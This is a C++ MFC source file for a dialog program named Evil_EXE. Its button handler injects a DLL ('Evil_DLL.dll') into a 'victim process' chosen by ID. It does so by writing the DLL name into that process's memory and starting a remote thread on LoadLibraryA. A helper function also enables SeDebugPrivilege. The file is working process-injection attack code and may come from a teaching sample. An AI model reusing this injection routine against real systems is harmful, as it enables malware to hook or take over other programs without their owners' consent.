// Evil_EXEDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Evil_DLL.h"
#include "Evil_EXE.h"
#include "Evil_EXEDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

typedef DWORD (WINAPI *pHookThreadProc)(LPVOID lpParameter);

// CEvil_EXEDlg dialog

CEvil_EXEDlg::CEvil_EXEDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CEvil_EXEDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CEvil_EXEDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CEvil_EXEDlg, CDialog)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDC_INSTALLHOOKS, &CEvil_EXEDlg::OnBnClickedInstallhooks)
END_MESSAGE_MAP()


// CEvil_EXEDlg message handlers

BOOL CEvil_EXEDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	// TODO: Add extra initialization here

	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CEvil_EXEDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CEvil_EXEDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


void CEvil_EXEDlg::OnBnClickedInstallhooks()
{
	DWORD dwThreadID = 0;
	HANDLE hThread = NULL;
	DWORD dwTargetProcID = 0;
	CString csProcID;

	// Get the Process ID of the victim process from the UI
	dwTargetProcID = GetDlgItemInt(IDC_PROCID);

	//EnableSeDebugPrivilege();

	// Get a process handle to the victim process
	HANDLE hTargetProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, 
									TRUE, dwTargetProcID);

	if(NULL == hTargetProc)
	{
		CString csMsg;
		csMsg.Format(_T("Failed to open process %ld.  Error = %ld."),
					 dwTargetProcID, GetLastError());

		AfxMessageBox(csMsg);
	}
	else
	{
		// The name of the DLL we want to inject
		LPSTR szFuncName = "Evil_DLL.dll";
		char *pszVAddr = NULL;

		// Allocate a buffer of appropriate size to hold the injected
		// DLL's name in the target process
		pszVAddr = (char*)VirtualAllocEx(hTargetProc, NULL, 
										strlen(szFuncName)+1, 
										MEM_COMMIT | MEM_RESERVE, 
										PAGE_READWRITE);

		if(NULL == pszVAddr)
		{
			CString csMsg;

			csMsg.Format(_T("Failed to allocate memory.  Error = %ld"), GetLastError());
			AfxMessageBox(csMsg);
		}

		// Copy the DLL name into the remote process' memory buffer
		SIZE_T nBytesWritten = 0;
		WriteProcessMemory(hTargetProc, pszVAddr, szFuncName, strlen(szFuncName)+1, &nBytesWritten);

		// Create a remote thred in the target process that will
		// load our DLL
		LPTHREAD_START_ROUTINE pThreadStart = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(__T("kernel32.dll")), "LoadLibraryA");
		hThread = CreateRemoteThread(hTargetProc, 
									NULL, //lpThreadAttributes, 
									0, //dwStackSize, 
									pThreadStart,//,
									pszVAddr, //lpParams, 
									0, //dwCreationFlags, 
									&dwThreadID);
	}

	if(NULL == hThread || 0 == dwThreadID)
		AfxMessageBox(_T("Failed to create remote thread."));

	// Clean up
	CloseHandle(hTargetProc);
}

void CEvil_EXEDlg::EnableSeDebugPrivilege()
{
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS,
								TRUE,
								GetCurrentProcessId());

	HANDLE hToken = NULL;
		
	if(!OpenProcessToken(hProc, TOKEN_ADJUST_PRIVILEGES, &hToken))
		AfxMessageBox(_T("Failed to get process token"));

	TOKEN_PRIVILEGES tp;
	LUID luid;

	if ( !LookupPrivilegeValue( 
			NULL,            // lookup privilege on local system
			SE_DEBUG_NAME,   // privilege to lookup 
			&luid ) )        // receives LUID of privilege
	{
		AfxMessageBox(_T("LookupPrivilegeValue failed")); 
		return; 
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Enable the privilege or disable all privileges.

	if ( !AdjustTokenPrivileges(
		   hToken, 
		   FALSE, 
		   &tp, 
		   sizeof(TOKEN_PRIVILEGES), 
		   (PTOKEN_PRIVILEGES) NULL, 
		   (PDWORD) NULL) )
	{ 
		  AfxMessageBox(_T("AdjustTokenPrivileges failed")); 
		  return; 
	} 

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		  AfxMessageBox(_T("The token does not have the specified privilege."));
		  return;
	} 

	CloseHandle(hToken);
	CloseHandle(hProc);
}